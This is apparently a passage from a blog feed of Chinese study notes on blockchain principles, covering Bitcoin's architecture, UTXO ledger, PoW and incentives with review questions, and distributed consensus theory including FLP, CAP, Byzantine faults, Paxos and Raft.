<p><strong>6. 请简述以太坊系统PoW共识机制采用的Ethash算法的主要计算过程？</strong></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>链原——比特币系统</title>
    <url>/2024/12/08/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E6%AF%94%E7%89%B9%E5%B8%81%E7%B3%BB%E7%BB%9F/</url>
    <content><![CDATA[<h2 id="比特币区块链系统架构"><a href="#比特币区块链系统架构" class="headerlink" title="比特币区块链系统架构"></a><strong>比特币区块链系统架构</strong></h2><p><strong>背景</strong>：比特币系统作为世界上第一个大规模成功运营的区块链系统，也建立了区块链系统体系结构的标准——P2P体系结构，即对等网络结构。</p>
<ul>
<li><p>每个节点都通过底层的P2P网络协议发现、连接其它区块链网络节点，并提供P2P网络的路由功能；</p>
</li>
<li><p>个节点可以通过PoW共识机制竞争计算新区块的出块权（俗称“挖矿”）；</p>
</li>
<li><p>每个节点都可以存储完整的区块链与账本数据，每个节点都可以发起和监听比特币网络上的交易信息，验证每个交易和区块的合法性</p>
</li>
</ul>
<h3 id="关于节点"><a href="#关于节点" class="headerlink" title="关于节点"></a>关于节点</h3><p><strong>节点总体上可以分为“全节点”、“轻节点”等两大类，其中发挥核心作用的是全节点。</strong></p>
<h4 id="全节点"><a href="#全节点" class="headerlink" title="全节点"></a>全节点</h4><ul>
<li><p><strong>全节点是比特币系统中功能最完整的节点</strong>，全节点一般要求保持一直在线，主要负责执行以下功能：</p>
</li>
<li><p><strong>参与区块记账权的竞争</strong>，通过PoW共识机制竞争下一个新区块的出块权，获得出块权的节点将获得系统激励，激励的方式就是奖励一定数量的比特币，也是比特币这种加密货币的唯一产生来源。</p>
</li>
<li><p><strong>存储完整的区块链与账本数据</strong>，每个全节点都保存了一个相同区块链与账本数据副本，自2009年比特币系统上线运行至今，每个全节点的区块链与账本数据存储容量已超过500GB。</p>
</li>
<li><p><strong>提供P2P网络路由与同步服务</strong>，监听系统网络上的交易、区块及事件信息，对接收到的交易和区块数据进行验证，并通过Gossip协议进行数据分发与同步。</p>
</li>
</ul>
<h4 id="轻节点"><a href="#轻节点" class="headerlink" title="轻节点"></a>轻节点</h4><ul>
<li><strong>轻节点主要负责提供交易和钱包功能，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息</strong>，以及与节点自身相关的交易信息，可以发起简单支付验证请求SPV（Simplified Payment Verification），向全节点请求数据来验证交易，也提供P2P网络的路由功能。</li>
</ul>
<h3 id="系统逻辑架构"><a href="#系统逻辑架构" class="headerlink" title="系统逻辑架构"></a><strong>系统逻辑架构</strong></h3><p><img src="https://s2.loli.net/2024/12/08/EJ1BiRgwbcCTXlM.png" alt="1.png"></p>
<ol>
<li><p>比特币系统的<strong>存储层</strong>主要采用文件系统和LevelDBKey-Value数据库</p>
</li>
<li><p>比特币系统的<strong>数据层</strong>是系统核心功能层级之一。</p>
<p><strong>主要功能</strong>：</p>
<ul>
<li>对比特币系统核心的区块、区块链、交易、账本、地址等关键数据结构进行定义和处理</li>
<li>负责将交易打包进区块，由区块组成区块链</li>
<li>没有采用传统的账户&#x2F;余额模型，而是采用特殊的UTXO模型构建账本数据，并基于底层的存储服务提供对比特币区块链数据的安全读写访问管理。</li>
</ul>
</li>
<li><p>比特币系统的<strong>网络层</strong>是系统核心功能层级之一，主要采用非结构化P2P网络，基于Gossip数据分发协议</p>
<p><strong>主要功能</strong>：</p>
<ul>
<li>实现网络节点快速发现与连接，以及区块、交易数据的分发与同步</li>
<li>为比特币系统各网络节点之间提供节点发现与安全连接通信机制</li>
<li>为交易、区块信息在区块链网络所有节点之间提供高效传播与有效性验证机制。</li>
</ul>
</li>
<li><p>比特币系统的<strong>共识层</strong>是系统核心功能层级之一，采用PoW工作量证明共识机制</p>
</li>
</ol>
<p>​	<strong>主要功能</strong>： </p>
<ul>
<li>​			让所有的比特币网络节点都认可每次计算产生的新区块</li>
<li>​	 	并且协调保证所有比特币网络节点数据记录一致性，使比特币系统的整体状态达成一致。</li>
</ul>
<ol start="5">
<li><p>比特币系统的<strong>激励层</strong>在共识层的功能基础上，提供了总量有限的比特币发行和出块激励机制，对于加入比特币网络的节点，都能公平地通过参与PoW工作量证明竞争计算，都有一定机率被区块链系统增发奖励一定数量的比特币。</p>
</li>
<li><p>比特币系统的<strong>合约层</strong>没有提供真正意义的智能合约功能，而是基于一种非图灵完备的、基于逆波兰表示法的Script脚本语言开发技术，提供交易相关<strong>锁定脚本&#x2F;解锁脚本</strong>的定制。</p>
</li>
</ol>
<hr>
<p>什么是锁定脚本&#x2F;解锁脚本?</p>
<hr>
<ol start="7">
<li><p>比特币系统的<strong>接口层</strong>提供了基于JSON RPC的SDK接口和命令行接口。</p>
</li>
<li><p>比特币系统的<strong>应用层</strong>基于接口层提供的SDK接口，可以基于比特币区块链实现面向电子支付等多种应用场景和业务逻辑的公有链应用</p>
</li>
</ol>
<h2 id="比特币系统数据层"><a href="#比特币系统数据层" class="headerlink" title="比特币系统数据层"></a><strong>比特币系统数据层</strong></h2><h3 id="区块与区块链"><a href="#区块与区块链" class="headerlink" title="区块与区块链"></a><strong>区块与区块链</strong></h3><p>   在比特币系统中，<strong>区块（Block）是区块链系统中最基本的数据单元，用于表示和记录区块链系统一段时间内发生的交易和状态结果</strong>的数据结构，是区块链系统各节点竞争完成一次共识计算的结果，多个区块采用链式结构链接在一起就构成了区块链（Blockchain）。每个区块<strong>又由区块头（Block Head）和区块体（Block Body）</strong>两部分组成。</p>
<p><img src="https://s2.loli.net/2024/12/08/ODqwtiFVTS9A2uz.png" alt="2.png"></p>
<p>在区块链系统的所有区块中，<strong>第一个区块被称为“创世区块”</strong>。每个区块中存储了一定数量的交易数据，都由交易发起人的数字签名来保证其真实性和合法性，从第二个区块开始，每个区块都保存了前一个区块（父区块）的区块头的哈希值，<strong>区块之间首尾相互连接就构成链式结构，因而先前区块里的任何数据都不可被篡改</strong></p>
<p><img src="https://s2.loli.net/2024/12/08/FTeoXCIjDL68cZ1.png" alt="3.png"></p>
<p><img src="https://s2.loli.net/2024/12/08/7HCfYpGqniOxhR1.png" alt="5.png"></p>
<h4 id="账本数据"><a href="#账本数据" class="headerlink" title="账本数据"></a>账本数据</h4><p><strong>在一个传统的具有支付功能的系统中，每个用户都有一个资金账户，支付系统会对每个账户的余额进行单独地记录和管理。当系统中有用户之间发生了支付的交易，系统会分别对参与交易的账户的余额信息进行检查和修改。</strong></p>
<p>（例如，甲向乙转账50元，首先需要检查甲的账户中有50元的余额，再从甲的账户中扣除50元，并向乙的账户中添加50元。可以看到，为了保证整个系统的正确性，系统需要确保对应的支付前提条件，如甲的账户中至少有50元的余额，同时也需要<strong>保证整个支付交易过程的原子性、一致性、隔离性及持久性（ACID）</strong>，即保证从甲账户扣减金额和向乙账户增加相同数量的金额这两个操作必须同时执行和完成，一旦受其他事件影响中断，甲和乙的账户必须恢复到交易前的状态。）</p>
<p>在比特币系统中没有直接的“账户”概念，而是用“账户地址”来代表用户的账户，相当于银行卡卡号，任何人都可以通过你的账户地址给你转账比特币。</p>
<p>​    <strong>(1)</strong> <strong>账户地址</strong></p>
<p>​    <strong>比特币的账户地址就是用户的公钥经过哈希计算及Base58编码运算后生成的160位（20字节）的字符串，账户地址计算生成流程。</strong></p>
<p><img src="https://s2.loli.net/2024/12/08/2kw4OhunQXGs8fC.png" alt="4.png"></p>
<h4 id="UTXO"><a href="#UTXO" class="headerlink" title="UTXO"></a>UTXO</h4><p>   <strong>(2)</strong> <strong>账本数据模型</strong></p>
<p>​    <strong>比特币系统账本没有采用传统的“账户&#x2F;余额”模型，而是提出了一种独特的UTXO（Unspent Transaction Output）未消费的交易输出模型，简称比特币UTXO模型。UTXO是一个包含交易数据和对应的执行代码的数据结构，所有的UTXO条目构成了比特币系统的“账本”。</strong></p>
<p>​    <strong>UTXO模型的本质是通过交易记录来构成系统账本，而不是通过账户信息构成账本。在比特币的每一笔支付交易中，都有“交易输入”（标识资金来源）和“交易输出”（标识资金去向），且每个交易都可以有多个交易输入和多个交易输出，交易之间按照时间戳的先后顺序排列，且任何一个交易中的交易输入都是其前序的某个交易中产生的“交易输出”，而所有交易的最初的交易输入都来自比特币系统节点生成区块得到的激励（比特币）。</strong></p>
<p>比特币系统中的每个“账户”可以视为对应着某个地址，比特币区块链不会直接跟踪每个地址的比特币余额，而是在区块链中存储交易数据的整个历史，比特币系统通过“交易池”跟踪区块链网络中所有UTXO的集合，而某个地址在某个时间点所具有的“余额”，是通过检查、求和与该地址相关的所有UTXO来计算。当使用UTXO时，它将从交易池中被删除，这将实时在计算余额时反映出来。</p>
<h4 id="交易数据结构"><a href="#交易数据结构" class="headerlink" title="交易数据结构"></a><strong>交易数据结构</strong></h4><p>​    在比特币的每一笔交易数据中，都包含一个或多个“交易输入”（标识资金来源）、一个或多个“交易输出”（标识资金去向）、交易时间戳等信息。</p>
<p><img src="https://s2.loli.net/2024/12/08/VK5SRgFi2ayNOCr.png" alt="6.png"></p>
<h5 id="交易输入数据结构"><a href="#交易输入数据结构" class="headerlink" title="交易输入数据结构"></a>交易输入数据结构</h5><h5 id="交易输出数据结构"><a href="#交易输出数据结构" class="headerlink" title="交易输出数据结构"></a>交易输出数据结构</h5><h4 id="状态数据"><a href="#状态数据" class="headerlink" title="状态数据"></a>状态数据</h4><p>在比特币系统中，交易表示一次价值转移操作，会导致账本状态的一次改变，如增加了一条交易记录；区块表示记录一段时间内发生的交易和状态结果，是对当前账本状态的一次共识和确认；链是由一个个区块按照发生时间顺序串联而成，可以看作是整个区块链状态变化的日志记录。</p>
<p><strong><strong>在一个比特币区块的区块头中包含了Merkle树根的哈希值，在区块体中包含了所有经过验证的交易数据。区块体中所有交易数据的哈希值构成了一棵Merkle树，每个叶子节点是每个交易信息的哈希值，将该Merkle树的根节点的值，称根哈希（Root Hash）或主哈希（Master Hash），存入区块头。</strong></strong></p>
<h3 id="比特币系统网络层"><a href="#比特币系统网络层" class="headerlink" title="比特币系统网络层"></a><strong>比特币系统网络层</strong></h3><h4 id="P2P网络结构"><a href="#P2P网络结构" class="headerlink" title="P2P网络结构"></a><strong>P2P网络结构</strong></h4><p><strong>比特币系统采用的P2P网络属于非结构化P2P网络，不存在中心服务器，比特币网络中存在“全节点”、“轻节点”等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同，其中发挥核心作用的是全节点。</strong></p>
<h4 id="全节点-1"><a href="#全节点-1" class="headerlink" title="全节点"></a><strong>全节点</strong></h4><p>全节点要一直在线，是比特币P2P网络中功能最完整的节点，全节点要竞争计算新区块的出块权，会存储完整的区块链数据，要监听比特币网络上的交易信息，验证每个交易的合法性，并提供P2P网络的路由功能。</p>
<h4 id="轻节点-1"><a href="#轻节点-1" class="headerlink" title="轻节点"></a><strong>轻节点</strong></h4><p>​    <strong>轻节点不需要一直在线，不参与出块权的竞争计算，不会存储完整的区块链，只需要保存每个区块的区块头信息，以及与自己相关的交易信息，可以发起简单支付验证请求SPV，向全节点请求数据来验证交易，并提供P2P网络的路由功能。轻节点除了主要提供交易功能外，还常常提供钱包功能。</strong></p>
<p>​    比特币系统的P2P网络基于TCP构建，默认RPC通信服务端口是8332，默认数据同步端口是8333，比特币系统的P2P网络主要采用了Gossip协议来实现节点发现、节点连接、区块广播、交易广播等功能。</p>
<h4 id="节点发现管理"><a href="#节点发现管理" class="headerlink" title="节点发现管理"></a><strong>节点发现管理</strong></h4><h4 id="交易广播"><a href="#交易广播" class="headerlink" title="交易广播"></a><strong>交易广播</strong></h4><p>在比特币系统中，节点为了向比特币系统发送一笔交易，需要向<strong>邻近的对等全节点</strong>发送Inv消息。如果接收到对等节点返回的GetData消息，节点再使用Tx消息向对等节点发送交易信息。对等节点接收到交易信息后，将以同样的方式向其它邻近节点转发交易信息。</p>
<p><img src="https://s2.loli.net/2024/12/08/p6GxrhvizQmdLHN.png" alt="7.png"></p>
<h4 id="交易池"><a href="#交易池" class="headerlink" title="交易池"></a><strong>交易池</strong></h4><p>比特币网络中每个节点都会维护一个未确认交易列表，称为“交易池”。节点使用交易池记录并跟踪等待被区块链系统确认的交易。例如，具有钱包功能的节点会使用交易池来记录那些已发送到网络但还未被确认的，只与该节点上的钱包相关的预支付交易信息。</p>
<p><strong>某些节点还维护一个单独的“孤立交易池”。所谓“孤立交易”是指，如果一个交易的输入与某未知的交易有关，如与缺失的父交易相关，该孤立交易就会被暂时存储在孤立交易池中直到父交易的信息到达。当一个交易被添加到交易池时，会同时检查孤立交易池，看是否有某个孤立交易引用了此交易的输出（子交易）。任何匹配的孤立交易会被进行验证。如果验证有效，它们会从孤立交易池中删除，并添加到交易池中。</strong></p>
<h4 id="区块广播与同步"><a href="#区块广播与同步" class="headerlink" title="区块广播与同步"></a><strong>区块广播与同步</strong></h4><h3 id="比特币系统共识层"><a href="#比特币系统共识层" class="headerlink" title="比特币系统共识层"></a><strong>比特币系统共识层</strong></h3><h4 id="PoW工作量证明共识机制"><a href="#PoW工作量证明共识机制" class="headerlink" title="PoW工作量证明共识机制"></a><strong>PoW工作量证明共识机制</strong></h4><p>比特币系统通过共识机制竞争计算生成新区块的过程，被称为“挖矿（Mine)”，因此比特币网络节点又被称为“矿工（Miner）”，后续如以太坊等其它区块链系统都延用了这种说法。</p>
<p><img src="https://s2.loli.net/2024/12/08/9ps7xHWcMnYlF43.png" alt="8.png"></p>
<h4 id="PoW共识机制的特点"><a href="#PoW共识机制的特点" class="headerlink" title="PoW共识机制的特点"></a><strong>PoW共识机制的特点</strong></h4><p><strong>比特币系统的PoW共识机制具有两大特点</strong>：</p>
<p>(1) 比特币系统PoW共识机制采用的“难题”具有难以解答，但很容易验证答案的正确性的特点，同时求解难题的“难度”，即比特币网络节点平均解出一个难题所消耗时间，是可以通过调整难题中的部分参数来进行控制的，因此比特币系统可以很好地控制链增长的速度；</p>
<p>(2) 通过控制区块链的增长速度，保证了如果一个节点成功解出难题完成了新区块的创建，该区块能够以更快的速度在所有节点之间传播，并且得到其他节点的验证，再结合比特币系统所采取的“最长链有效”的评判机制，就能够在大多数（超过比特币网络51%算力）节点都是诚实的情况下，避免恶意节点对区块链的控制。</p>
<h4 id="竞争出块冲突"><a href="#竞争出块冲突" class="headerlink" title="竞争出块冲突"></a><strong>竞争出块冲突</strong></h4><h3 id="比特币系统激励层"><a href="#比特币系统激励层" class="headerlink" title="比特币系统激励层"></a><strong>比特币系统激励层</strong></h3><h4 id="激励机制"><a href="#激励机制" class="headerlink" title="激励机制"></a>激励机制</h4><p><strong>在比特币系统中，比特币网络约每10分钟生成一个不超过1MB大小的区块，用于记录这10分钟内发生的验证过的交易内容，并将区块串联到最长的链尾部，每个区块的成功提交者可以得到系统一定数量的比特币的奖励（该奖励将作为区块内的第一个CoinBase交易，并将在一定区块数后才能使用），以及用户附加到交易上的支付服务费用。因此，即使没有任何用户交易，比特币网络也可以自行产生合法的区块并生成奖励。每个区块的奖励最初是50个比特币，每隔21万个区块（约4年时间）自动减半，最终比特币总量稳定在2100万个</strong></p>
<p><strong>比特币系统的激励机制主要包括以下要点：</strong></p>
<p>(1)加密货币总量固定：比特币总量不超过 2100 万个。</p>
<p>(2)出块激励：每当有节点获得一个区块的记账权，比特币系统就会发行出新的比特币作为对节点的奖励。一个区块产生的比特币数量都会按几何级数递减，每产出 21 万个区块，获得奖励的比特币数量就会减少 50% 。截至2022年，每个区块的奖励已降低为6.25个比特币，是比特币系统上线时的八分之一。</p>
<p>(3)交易激励：用户会在交易中包含交易费，作为处理交易的服务费支付给获得区块记账权的节点。</p>
<h3 id="比特币系统合约层"><a href="#比特币系统合约层" class="headerlink" title="比特币系统合约层"></a><strong>比特币系统合约层</strong></h3><h4 id="比特币系统的交易脚本"><a href="#比特币系统的交易脚本" class="headerlink" title="比特币系统的交易脚本"></a>比特币系统的交易脚本</h4><p>比特币系统没有账户机制，而采用了一种比较特别的 UTXO交易模型，类似于财务会计记账方法，每一笔交易数据主要包括两部分：交易输入记录和交易输出记录。</p>
<p>   （1）交易输出记录中除了包含输出比特币金额外，还包含了称为“锁定脚本”的一段脚本代码。</p>
<p>   （2）交易输入记录中除了包含对前一个交易输出部分的引用外，还包含了称为“解锁脚本”的一段脚本代码。</p>
<h4 id="交易脚本执行机制"><a href="#交易脚本执行机制" class="headerlink" title="交易脚本执行机制"></a><strong>交易脚本执行机制</strong></h4><p><strong>图灵完备性</strong></p>
<p><strong>逆波兰表示法</strong></p>
<h4 id="交易标准脚本"><a href="#交易标准脚本" class="headerlink" title="交易标准脚本"></a><strong>交易标准脚本</strong></h4><p><strong>（一）填空题</strong></p>
<p><strong>1. 在比特币系统中，每个区块又由      和      两部分组成。</strong></p>
<p><strong>2.    年  月，随着比特币区块链系统生成了第一个区块，标志着世界上第一个区块链系统的诞生。</strong></p>
<p><strong>3. 比特币的标准单位是      ，最小单位是      ，1个标准单位的比特币等于       个最小单位的比特币。</strong></p>
<p><strong>4. 比特币系统的发行量每四年减半，总量上限为    万枚，并且无法被超发。</strong></p>
<p><strong>5. 比特币网络中存在     、     等不同类型的节点，不同类型的节点在网络中扮演的角色也有所不同。</strong></p>
<p><strong>6. 比特币系统每个区块的区块体所包含的交易记录列表，实际上就是可以用于唯一标识与检索指定交易的交易哈希值列表，区块头中将存储由所有交易哈希值构造的     树的根哈希值。</strong></p>
<p><strong>（二）选择题</strong></p>
<p><strong>1. 在区块链系统的所有区块中，第一个区块被称为（   ）。</strong></p>
<p><strong>A. 初始区块    B. 创世区块      C. 元区块      D. 头区块</strong></p>
<p><strong>2. 在比特币系统区块链的每个区块的区块头中会保存多个哈希值，但没有保存（   ）。</strong></p>
<p><strong>A. 当前区块整体的哈希值         B. 当前区块的区块头的哈希</strong></p>
<p><strong>C. 前一个区块的区块头的哈希值      D. 下一个区块的区块头的哈希值</strong></p>
<p><strong>3. 比特币系统采用（   ）模型，通过交易记录来构成系统账本。</strong></p>
<p><strong>A. UTXO      B. 账户       C. 数据库       D. 会计</strong></p>
<p><strong>4. 比特币的账户地址就是（   ）经过一系列哈希计算及Base58编码运算后生成的160位（20字节）的字符串。</strong></p>
<p><strong>A. 用户私钥    B. 用户公钥     C. 随机数       D. 节点IP地址</strong></p>
<p><strong>5. 在比特币系统中，每一笔交易数据中不包含的是（    ）。</strong></p>
<p><strong>A. 交易输入    B. 交易输出     C. 交易哈希      D. 交易金额</strong></p>
<p>（<strong>三）简答题（任选3道）</strong></p>
<p><strong>1. 请简述比特币系统的区块链中各个区块是怎么链接的</strong>？</p>
<p><strong>2. 请简述比特币系统的“账户地址”是怎样计算生成的</strong>？</p>
<p><strong>3. 请简单分析比特币系统PoW共识机制节点竞争计算生成新区块的过程</strong>？</p>
<p><strong>4. 请简述比特币系统的出块激励规则</strong>？</p>
<p><strong>5. 请简述比特币系统如何处理竞争出块冲突和孤块</strong></p>
<p><strong>6.什么是比特币区块链系统的Layer2技术，请分析一个典型的比特币Layer2项目？</strong></p>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>链原——共识机制</title>
    <url>/2024/12/20/%E9%93%BE%E5%8E%9F%E2%80%94%E2%80%94%E5%85%B1%E8%AF%86%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<h2 id="区块链共识机制"><a href="#区块链共识机制" class="headerlink" title="区块链共识机制"></a><strong>区块链共识机制</strong></h2><p><strong>由于各个节点的自身状态和所处网络环境不尽相同，而交易信息的传递又需要时间，并且消息传递本身不可靠，每个节点接收到的需要记录的交易内容和顺序也难以保持一致。因此，区块链系统的共识问题，或者说账本数据一致性问题，是关系着整个区块链系统的正确性和安全性的关键问题。</strong></p>
<h3 id="共识基本原理与问题"><a href="#共识基本原理与问题" class="headerlink" title="共识基本原理与问题"></a><strong>共识基本原理与问题</strong></h3><h4 id="数据一致性问题"><a href="#数据一致性问题" class="headerlink" title="数据一致性问题"></a><strong>数据一致性问题</strong></h4><p>区块链系统的分布式账本中，如何确保分散存储于多个不同网络节点的账本数据在任意时刻都是一致与可信的，不会发生数据冲突与错误，这就涉及分布式系统的一致性问题。</p>
<p><strong>在分布式系统中，各个节点数据的一致性与节点数据的可信性并不是一个问题，解决系统一致性问题并不一定能保证系统数据的正确可信，区块链共识机制的关键是需要同时解决好一致性与可信性两个问题</strong></p>
<h4 id="FLP定理"><a href="#FLP定理" class="headerlink" title="FLP定理"></a>FLP定理</h4><p><strong>FLP定理1：在异步通信的分布式系统中，即使只有一个进程失败，也没有任何算法能保证非故障进程达到一致性。</strong></p>
<p><strong>FLP定理假设的分布式系统模型如下：</strong></p>
<p>  <strong>(1) 异步通信</strong>：异步通信与同步通信的最大区别是没有时钟、不能时间同步、不能使用超时、不能探测失败、消息可任意延迟、消息可乱序；</p>
<p>  <strong>(2) 通信健壮</strong>：只要进程非失败，消息虽会被无限延迟，但最终会被送达，且消息仅会被送达一次（无重复）；</p>
<p>  <strong>(3) Fail-Stop模型</strong>：进程失败如同宕机，不再处理任何消息，也不会产生错误消息；</p>
<p>  <strong>(4) 失败进程数量</strong>：最多只有一个进程失败或单节点宕机。</p>
<p><strong>FLP定理2：假设在一个分布式系统中，绝大多数进程最初都是正常运行的，且没有进程在运行过程中发生故障，则一定存在一个部分正确的共识协议使所有非故障进程总是能达成一致决议。</strong></p>
<p><strong>安全性（Safety）与活性（Liveness）两种分布式系统特性</strong>：</p>
<p>  (1)“安全性”是指当分布式系统中即使有节点发生故障时，也不会导致系统产生错误的数据结果。</p>
<p>  (2)“活性”是指分布式系统中即使有节点发生故障时，系统也可以一直持续运行下去，不会发生系统瘫痪。</p>
<h4 id="CAP定理"><a href="#CAP定理" class="headerlink" title="CAP定理"></a>CAP定理</h4><p><strong>CAP定理：一个分布式系统不可能同时满足一致性、可用性、分区容错等三个特性，最多具有一致性、可用性、分区容错这三个特性中的两个。</strong></p>
<p>CAP定理的名称是其定义中给出的分布式系统的一致性（Consistency）、可用性（Availability）、分区容错（Partition Tolerance）三个特性的英文首字母缩写。</p>
<p><strong>(1)</strong> <strong>一致性</strong></p>
<p>   <strong>在CAP定理中，分布式系统的一致性是指各节点的数据保证一致，即每次从任意节点写入数据后，后续其它节点都能读取到最新的数据。</strong></p>
<p>  <strong>(2) 可用性</strong></p>
<p>   <strong>在CAP定理中，分布式系统的可用性是指每次向非故障的节点发送请求，总能保证收到响应数据。</strong></p>
<p>  <strong>(3)</strong> <strong>分区容错</strong></p>
<p>   <strong>在CAP定理中，分布式系统的分区容错是指系统可以容忍不同节点之间消息传递存在延迟或丢失等错误，而不影响系统整体正常运行。</strong></p>
<h4 id="两军问题"><a href="#两军问题" class="headerlink" title="两军问题"></a><strong>两军问题</strong></h4><p><strong>原本是用来分析在一个不可靠的通信链路上试图通过通信以达成一致是存在问题的，后来常被用于阐述分布式系统的一致性和共识问题</strong></p>
<h4 id="拜占庭将军问题"><a href="#拜占庭将军问题" class="headerlink" title="拜占庭将军问题"></a><strong>拜占庭将军问题</strong></h4><p><strong>拜占庭将军问题描述了</strong>如何在存在恶意行为（如消息被篡改）的情况下实现分布式系统的一致性，该问题既是分布式系统领域最复杂的容错模型之一，也是我们理解分布式共识算法和协议的重要基础。</p>
<ul>
<li><p><strong>问题求解</strong></p>
<p> 如果将拜占庭问题中的攻城军队的将军数量对应为分布式系统的节点数量，可以将符合拜占庭问题条件的分布式系统称为“拜占庭系统”，在拜占庭系统中任意两个节点之间的通信是保证可达的，综合上面对最简单的三将军情形分析，可以得出以下结论：</p>
</li>
</ul>
<p><strong>对于一个拜占庭系统，如果系统总节点数为Z，表示叛变将军的不可靠节点数为X，只有当Z≥3X＋1时，可由基于拜占庭容错（BFT）类算法的协议保证系统的一致性。</strong></p>
<p>  在实际的系统中，一般把由于系统故障导致节点不响应的情况归类为“非拜占庭错误（Crash Fault）”，把节点伪造或篡改信息进行恶意响应的情况归类为“拜占庭错误（Byzantine Fault）”。</p>
<h3 id="非拜占庭容错类共识算法（CFT）"><a href="#非拜占庭容错类共识算法（CFT）" class="headerlink" title="非拜占庭容错类共识算法（CFT）"></a><strong>非拜占庭容错类共识算法</strong>（CFT）</h3><p>​     对于分布式系统，非拜占庭容错类共识算法能在节点发生系统故障或非计划停机等非拜占庭错误时，确保整个分布式系统的可靠性；但是，当系统中存在恶意节点伪造或篡改数据等行为时，非拜占庭容错算法无法保证系统的可靠性。因此，非拜占庭容错类共识算法主要用于实现封闭的、系统节点都受控的企业级分布式系统，如某企业构建的内部分布式应用集群系统或分布式存储系统。非拜占庭容错类共识算法中最有代表性的包括Paxos算法与Raft算法。</p>
<h4 id="Paxos算法"><a href="#Paxos算法" class="headerlink" title="Paxos算法"></a><strong>Paxos算法</strong></h4><p>  Paxos算法是基于消息传递且具有高度容错特性的一致性算法，是目前公认的解决分布式一致性问题最有效的算法之一，其解决的问题就是在分布式系统中如何就某个值（决议）达成一致。</p>
<p><strong>前提1</strong>：为了保证不出现一些不合法的命令序列，Paxos算法运行的环境必须处在一个可靠的通信网络环境中。即使在异步通信过程中，发送的数据可能会丢失（Lost）、延迟（Delayed）或重复（Duplicated），但不会出现被篡改。</p>
<p>**前提2:**Paxos算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。</p>
<p><strong>Paxos算法的原理</strong></p>
<p>​    <strong>Paxos算法把一个分布式系统中节点划分为3种角色：Proposer（提出提案者）、Acceptor（接受提案者）和Learner（学习决议者）。一个节点可以同时拥有多个角色。</strong></p>
<p><strong>Proposer（提出提案者）</strong>：提出提案，提案信息包括提案编号n和提案内容v。常常是分布式系统的发送消息数据的节点担任该角色。</p>
<p><strong>Acceptor（接受提案者）</strong>：收到并审批提案，若提案获得多数Acceptor的接受，则该提案被批准。常常是分布式系统接收消息数据的节点担任该角色，一般需要至少3个且节点个数为奇数，因为Paxos算法最终要产生一个大多数决策者都同意的提案。</p>
<p><strong>Learner（学习决议者）</strong>：被告知提案结果，并与之统一，不参与审批过程，执行被批准的提案中包含的提案内容。</p>
<p><strong>一个Paxos算法实例的执行包括准备提案（Prepare）和提交提案（Commit）两个阶段，Paxos算法流程如图所示。</strong></p>
<p><img src="https://s2.loli.net/2024/12/21/hBeaGVUxCMbjHZy.png" alt="1.png"></p>
<p>  <strong>(1) 准备提案阶段</strong></p>
<p>   <strong>Proposer节点收到Acceptor节点的响应，可能存在抢占失败或抢占成功两种情况：</strong> </p>
<p><strong>如果Proposer节点收到超半数以上的Acceptor节点回复的提案编号要大于自己发送的提案编号；则抢占失败。</strong></p>
<p><strong>如果Proposer节点收到超半数以上Acceptor节点的回复的提案编号等于自己发送的提案编号，则抢占成功；这时Proposer节点就可以进入下一个“提交提案”阶段。</strong></p>
<p><strong>(2) 提交提案阶段</strong></p>
<p><strong>Proposer节点将抢占的提案编号 n 和提案内容v发送给Acceptor节点。Acceptor节点只批准比自己已经接受提案的编号N大或等于的提案（称为“审批成功”）；并承诺不再接受小于 n 的提案。</strong></p>
<p><strong>Acceptor节点收到提案后，如果提案的编号大于等于它已经接受的所有提案编号，则Acceptor节点将批准此提案内容并将此批准过的提案回复给Proposer节点。如果提交审批的提案编号小于它已经接受的提案编号，则审批失败，并回复所接受的提案编号。</strong></p>
<p><strong>如果Proposer节点收到多数派审批失败（此种情况也称为“提案失败”），则将提案编号递增一，重新进入“准备提案阶段”。</strong></p>
<p><strong>如果Proposer节点收到多数派提案内容相同，则此决议案已经形成。</strong></p>
<p><strong>Paxos算法的局限性</strong></p>
<p>​    Paxos算法虽然可以容忍已经申请到访问权的Proposer节点故障，可以容忍少数Acceptor节点故障；但在出现竞争的情况下，其收敛速度很慢，甚至可能出现活锁的情况，例如当有等于或多于Acceptor节点数量的Proposer节点同时发送提案请求后，很难有一个Proposer节点收到半数以上的回复而不断地执行第一阶段的协议。</p>
<h4 id="Raft算法"><a href="#Raft算法" class="headerlink" title="Raft算法"></a><strong>Raft算法</strong></h4><p><strong>Raft算法名字来源于可靠（Reliable）、可复制（Replicated）、可冗余（Redundant）与可容错（Fault-Tolerant）。</strong></p>
<p>​    <strong>Raft算法要解决核心问题仍然是在没有拜占庭错误下的分布式系统的共识问题，即在系统节点不会做恶，传递的消息也不会被篡改的前提下如何保证每个节点在执行相同的命令序列。</strong></p>
<p><strong>前提1：原来的Leader节点发生故障失效后，必须选出一个新的Leader节点，日志复制的顺序也是确定的，必须从Leader节点流向Follower节点。</strong></p>
<p><strong>前提2：日志复制只允许Leader节点从客户端接收日志，并复制到整个分布式系统的节点中。</strong></p>
<p><strong>前提3：与Paxos算法一样，Raft算法运行的环境不会出现拜占庭将军问题，即节点群在决定命令序列的过程中不存在恶意节点或受到病毒、黑客的影响的节点。</strong></p>
<p><strong>Raft算法的原理</strong></p>
<p>​    <strong>Raft算法中，分布式系统的各节点通过心跳（Heartbeat）消息来保持通信，一个节点可以是以下三种角色中的一种：</strong></p>
<p><strong>Leader（领导者）：</strong>Leader节点也称为“主节点”，用于对所有用户的请求进行处理。Leader 节点将带领分布式系统中的所有节点对数据更改达成一致，这个过程被称为日志同步。</p>
<p><strong>Follower（跟随者）：</strong>Follower节点也称为“从节点”，不会主动发送消息，只响应来自Leader节点与Candidate节点的请求。最开始时，所有的节点都是Follower节点，如果Follower节点收不到Leader节点的心跳消息，那么Follower节点会变为Candidate节点。</p>
<p><strong>Candidate（候选人）</strong>：Candidate节点是准备竞选Leader的节点。Candidate节点会向其他节点发起投票（包括投给自己的一票），如果一个Candidate节点收到了半数以上的选票，那么它就当选为新的Leader节点。</p>
